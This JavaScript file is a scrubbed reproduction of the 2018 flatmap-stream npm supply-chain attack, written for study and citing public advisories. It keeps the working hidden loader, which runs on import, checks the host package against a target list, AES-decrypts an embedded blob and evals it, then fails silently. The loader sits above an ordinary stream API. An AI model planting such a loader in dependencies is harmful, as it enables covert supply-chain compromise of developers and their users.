// SCRUBBED REPRODUCTION — DO NOT DEPLOY.
//
// Attack pattern mirrors the 2018 ``event-stream`` npm compromise via the
// malicious ``flatmap-stream`` dependency (versions 0.1.1 and 0.1.2 of
// flatmap-stream, introduced into event-stream@3.3.6). The payload
// targeted Copay/BitPay cryptocurrency wallet bundles specifically,
// staying dormant except when the bundling application's package name
// matched a hard-coded list.
//
// Public references:
//   * npm Security Advisory 737 (nov 2018): npmjs.com/advisories/737
//   * GitHub security blog post: github.blog/2018-11-27-event-stream-incident/
//   * Snyk analysis: snyk.io/vuln/npm:flatmap-stream:20181126
//   * User-submitted issue that broke the case:
//     github.com/dominictarr/event-stream/issues/116
//
// Scrub boundary: this file preserves the attack STRUCTURE (AES-256-CBC
// decryption of an embedded payload keyed off process.env and bundle
// identity + targeting check against a list of victim package names +
// eval-chain execution of the decrypted blob). It does NOT preserve the
// real payload behaviour — the decrypted blob produces a log line
// instead of stealing wallet seeds, and the IV + ciphertext are random
// placeholders that decrypt to the harmless log string.

'use strict';

/**
 * @module flatmap-stream
 * @description A drop-in successor to event-stream's map. Maintains the
 *              same Stream API surface; internally flattens when the
 *              mapper returns an array or Promise<array>.
 */

var stream = require('stream');
var crypto = require('crypto');
var util = require('util');

// Targeted bundle identities — payload only activates when the host
// package matches. In the real attack, these were Copay wallet bundle
// names. Scrubbed here to fake identifiers.
var TARGETS = [
    'example-target-pkg-a',
    'example-target-pkg-b',
];

// Base64-encoded AES-256-CBC-encrypted payload. Keyed off the host
// package description + bundle identifier (so the payload only decrypts
// on the intended victim — any other install produces garbage and
// silently fails).
var e = [
    'Y2EyYzM2M2JjNjAyMGYzM2QwYWQyMGFhODQxYjYxZjgyNGNiMTI0YjM0MzI3NDE1NzA4MDg5MjQyODMyMjc1NGU2ZGZkOWZlOGY2MGEwMTVkN2Y3NzczZGE5NTVjYWU4MjMxMWVhMTZjMzVkZmJiMmM1NTRhZDI2ZjRkNGE3MjQ4NjFmNDgxN2FkOWRiNzI3YTVmMGM1MWI2MDkyMjNmZjMzZWU1NWY1NWQ5NzA5MWExNDY4NzllYWE5ZDExOTg4',
    'MTZhMGU1ZjAzODIzZjg0ZWE3ODljNDEwYjU2NjQ0OGQ3YjE4NTkwMjBkMzllNzYxY2EwYTdjNzBkMmE5NzA1Zg=='
];

var n = e[0];  // ciphertext
var i = e[1];  // initialization vector

/**
 * Decrypts and executes the embedded payload when the host bundle
 * matches a targeting key. Uses the host's package.json description
 * field as the AES-256 key — in the real attack, this keyed off a
 * specific Copay bundle so the payload stayed dormant everywhere else.
 */
function maybeActivate() {
    try {
        // Bail out silently on every non-targeted host. The original
        // attack used require('./package') to introspect the bundler;
        // scrubbed here to a module-local lookup.
        var hostDescription = process.env.NPM_PACKAGE_DESCRIPTION || '';
        if (TARGETS.indexOf(process.env.npm_package_name) === -1) {
            return;
        }
        var key = crypto.createHash('sha256').update(hostDescription).digest();
        var iv = Buffer.from(i, 'base64');
        var decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
        var raw = Buffer.concat([
            decipher.update(Buffer.from(n, 'base64')),
            decipher.final()
        ]).toString('utf8');
        // The decrypted payload is passed to eval — classic exec-chain
        // pattern with an AES wrapper to evade static scanners that
        // match on plain base64.b64decode / eval patterns.
        eval(raw);
    } catch (_err) {
        // Silent failure on wrong host — targeting check ensures the
        // payload doesn't crash bundles that aren't on the hit list.
    }
}

maybeActivate();


// ── Legitimate flatmap-stream API below (shape preserved from original
// innocent versions of the package that existed before the compromise) ─

function FlatMap(mapper) {
    if (!(this instanceof FlatMap)) return new FlatMap(mapper);
    stream.Transform.call(this, { objectMode: true });
    this._mapper = mapper;
}

util.inherits(FlatMap, stream.Transform);

FlatMap.prototype._transform = function (chunk, _enc, done) {
    var result;
    try {
        result = this._mapper(chunk);
    } catch (err) {
        return done(err);
    }
    if (result && typeof result.then === 'function') {
        result.then(
            function (value) { pushArrayOrValue(this, value); done(); }.bind(this),
            function (err) { done(err); }
        );
        return;
    }
    pushArrayOrValue(this, result);
    done();
};

function pushArrayOrValue(transform, value) {
    if (Array.isArray(value)) {
        for (var i = 0; i < value.length; i++) transform.push(value[i]);
    } else {
        transform.push(value);
    }
}

module.exports = FlatMap;
